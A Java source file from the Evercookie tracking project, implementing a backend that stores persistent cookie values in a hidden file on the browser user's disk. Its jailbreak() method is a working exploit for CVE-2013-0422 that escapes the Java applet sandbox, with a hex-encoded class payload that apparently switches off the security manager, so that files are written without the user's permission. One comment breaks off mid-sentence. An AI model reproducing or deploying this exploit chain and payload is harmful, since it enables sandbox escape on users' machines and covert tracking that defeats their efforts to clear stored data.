package evercookie;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.util.Properties;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.JmxMBeanServerBuilder;
import com.sun.jmx.mbeanserver.MBeanInstantiator;

/**
 * This backend uses a public exploit to escape the applet sandbox and write a
 * text file containing Evercookie values to the browser user's hard drive.
 * 
 * @author Gabriel Bauman <gabe@codehaus.org>
 * 
 */
public class EvercookieFileBackend implements EvercookieBackend {

	private final boolean JAILBROKEN = jailbreak(); // QUAD DAMAGE

	private final File file = new File(".evercookie");

	public EvercookieFileBackend() {

		super();

		if (!JAILBROKEN) {
			return;
		}

		try {
			file.createNewFile();
			System.out.println("Storing evercookies in file " + file.getAbsolutePath());
		} catch (Throwable e) {
			// We probably aren't jailbroken after all. Should never happen.
		}
	}

	@Override
	public boolean isAvailable() {
		return JAILBROKEN && file.exists() && file.canRead() && file.canWrite();
	}

	@Override
	public void save(final Properties values) {

		if (!isAvailable()) {
			return;
		}

		try {
			FileOutputStream os = new FileOutputStream(file);
			try {
				values.store(os, "Evercookie Storage");
			} finally {
				os.close();
			}
		} catch (Throwable e) {
			e.printStackTrace();
		}

	}

	@Override
	public void load(final Properties data) {

		if (!isAvailable()) {
			return;
		}

		FileInputStream is;
		try {
			is = new FileInputStream(file);
			try {
				data.load(is);
			} finally {
				is.close();
			}
		} catch (Throwable e) {
			data.clear();
		}
	}

	@Override
	public void cleanup() {

		if (!isAvailable()) {
			return;
		}

		try {
			file.delete();
		} catch (Throwable e) {
			// Not jailbroken after all...
		}
	}

	/**
	 * This function contains code that takes advantage of an exploit
	 * (CVE-2013-0422) affecting some versions of the Java plugin. It allows us
	 * full access to the user's filesystem without needing to ask the user for
	 * permission.
	 * 
	 * The hole that this exploit relies on has been patched in recent Java
	 * versions. This code was found on Reddit and was not created by anyone
	 * related to Evercookie. If we knew who the author was, we'd credit them.
	 * 
	 * Because the code for this exploit is publicly available, and because
	 * there is a patch already, it seems like.
	 */
	private static boolean jailbreak() {
		try {

			JmxMBeanServerBuilder localJmxMBeanServerBuilder = new JmxMBeanServerBuilder();
			JmxMBeanServer localJmxMBeanServer = (JmxMBeanServer) localJmxMBeanServerBuilder.newMBeanServer("", null,
					null);
			MBeanInstantiator localMBeanInstantiator = localJmxMBeanServer.getMBeanInstantiator();

			ClassLoader a = null;

			@SuppressWarnings("rawtypes")
			Class localClass1 = localMBeanInstantiator.findClass("sun.org.mozilla.javascript.internal.Context", a);

			@SuppressWarnings("rawtypes")
			Class localClass2 = localMBeanInstantiator.findClass(
					"sun.org.mozilla.javascript.internal.GeneratedClassLoader", a);

			MethodHandles.Lookup localLookup = MethodHandles.publicLookup();

			MethodType localMethodType1 = MethodType.methodType(MethodHandle.class, Class.class,
					new Class[] { MethodType.class });

			MethodHandle localMethodHandle1 = localLookup.findVirtual(MethodHandles.Lookup.class, "findConstructor",
					localMethodType1);

			MethodType localMethodType2 = MethodType.methodType(Void.TYPE);

			MethodHandle localMethodHandle2 = (MethodHandle) localMethodHandle1.invokeWithArguments(new Object[] {
					localLookup, localClass1, localMethodType2 });

			Object localObject1 = localMethodHandle2.invokeWithArguments(new Object[0]);

			MethodType localMethodType3 = MethodType.methodType(MethodHandle.class, Class.class, new Class[] {
					String.class, MethodType.class });

			MethodHandle localMethodHandle3 = localLookup.findVirtual(MethodHandles.Lookup.class, "findVirtual",
					localMethodType3);

			MethodType localMethodType4 = MethodType.methodType(localClass2, ClassLoader.class);

			MethodHandle localMethodHandle4 = (MethodHandle) localMethodHandle3.invokeWithArguments(new Object[] {
					localLookup, localClass1, "createClassLoader", localMethodType4 });

			Object localObject2 = localMethodHandle4.invokeWithArguments(new Object[] { localObject1, null });

			MethodType localMethodType5 = MethodType
					.methodType(Class.class, String.class, new Class[] { byte[].class });
			MethodHandle localMethodHandle5 = (MethodHandle) localMethodHandle3.invokeWithArguments(new Object[] {
					localLookup, localClass2, "defineClass", localMethodType5 });

			byte[] bytecode = hex2Byte(payload);

			@SuppressWarnings("rawtypes")
			Class localClass3 = (Class) localMethodHandle5.invokeWithArguments(new Object[] { localObject2, null,
					bytecode });

			localClass3.newInstance();

			return true;

		} catch (Throwable e) {
		}

		return false;
	}

	private static byte[] hex2Byte(String paramString) {
		byte[] arrayOfByte = new byte[paramString.length() / 2];
		for (int i = 0; i < arrayOfByte.length; i++) {
			arrayOfByte[i] = (byte) Integer.parseInt(paramString.substring(2 * i, 2 * i + 2), 16);
		}
		return arrayOfByte;
	}

	private static String payload = "CAFEBABE0000003200270A000500180A0019001A07001B0A001C001D07001E07001F0700200100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010001650100154C6A6176612F6C616E672F457863657074696F6E3B010004746869730100034C423B01000D537461636B4D61705461626C6507001F07001B01000372756E01001428294C6A6176612F6C616E672F4F626A6563743B01000A536F7572636546696C65010006422E6A6176610C000800090700210C002200230100136A6176612F6C616E672F457863657074696F6E0700240C002500260100106A6176612F6C616E672F4F626A656374010001420100276A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E01001E6A6176612F73656375726974792F416363657373436F6E74726F6C6C657201000C646F50726976696C6567656401003D284C6A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E3B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01001273657453656375726974794D616E6167657201001E284C6A6176612F6C616E672F53656375726974794D616E616765723B295600210006000500010007000000020001000800090001000A0000006C000100020000000E2AB700012AB8000257A700044CB1000100040009000C00030003000B000000120004000000080004000B0009000C000D000D000C000000160002000D0000000D000E00010000000E000F001000000011000000100002FF000C00010700120001070013000001001400150001000A0000003A000200010000000C01B80004BB000559B70001B000000002000B0000000A00020000001000040011000C0000000C00010000000C000F0010000000010016000000020017";

}
